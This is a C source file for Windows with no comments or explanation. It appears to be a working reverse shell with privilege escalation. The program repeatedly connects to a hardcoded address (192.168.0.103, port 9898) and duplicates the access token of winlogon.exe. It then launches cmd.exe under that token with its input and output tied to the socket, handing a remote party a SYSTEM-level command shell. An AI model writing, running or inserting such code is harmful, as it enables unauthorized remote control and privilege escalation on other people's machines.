#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <TlHelp32.h>
#include <locale.h>

#pragma comment(lib, "Ws2_32.lib") 

DWORD GetWinlogonPid() {
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    if (Process32First(snapshot, &entry) == TRUE)
    {
        while (Process32Next(snapshot, &entry) == TRUE)
        {
            if (_wcsicmp(entry.szExeFile, L"winlogon.exe") == 0)
            {
                return entry.th32ProcessID;
            }
        }
    }
    return 0;
}

int main() {
    setlocale(LC_ALL, "");
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return WSAGetLastError();
    }

    ADDRINFOW addrinfo = { 0 }, * result;
    addrinfo.ai_socktype = SOCK_STREAM;
    addrinfo.ai_family = AF_INET;
    if (GetAddrInfo(L"192.168.0.103", L"9898", &addrinfo, &result) != 0) {
        return WSAGetLastError();
    }


    SOCKET sc;
    sc = WSASocket(result->ai_family, result->ai_socktype, result->ai_protocol, NULL,NULL,NULL);
    int iResult = WSAGetLastError();
    while (WSAConnect(sc, result->ai_addr, (int)result->ai_addrlen, NULL, NULL, NULL, NULL) != 0) {
        Sleep(5000);
    }

    STARTUPINFO startinf;
    PROCESS_INFORMATION pi;
    memset(&startinf, 0, sizeof(startinf));
    startinf.cb = sizeof(startinf);
    startinf.hStdInput = startinf.hStdOutput = startinf.hStdError = (HANDLE)sc;
    startinf.dwFlags = STARTF_USESTDHANDLES;
    HANDLE hProcess = NULL;
    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetWinlogonPid());
    if (hProcess == NULL) {
        return GetLastError();
    }
    HANDLE hOldToken = NULL;
    OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hOldToken);
    HANDLE hNewToken = NULL;
    DuplicateTokenEx(hOldToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hNewToken);

    wchar_t cmdline[] = L"C:\\Windows\\System32\\cmd.exe";
    CreateProcessWithTokenW(hNewToken, LOGON_WITH_PROFILE, NULL, cmdline, 0, NULL, NULL, &startinf, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    closesocket(sc);
    WSACleanup();

    return 0;
}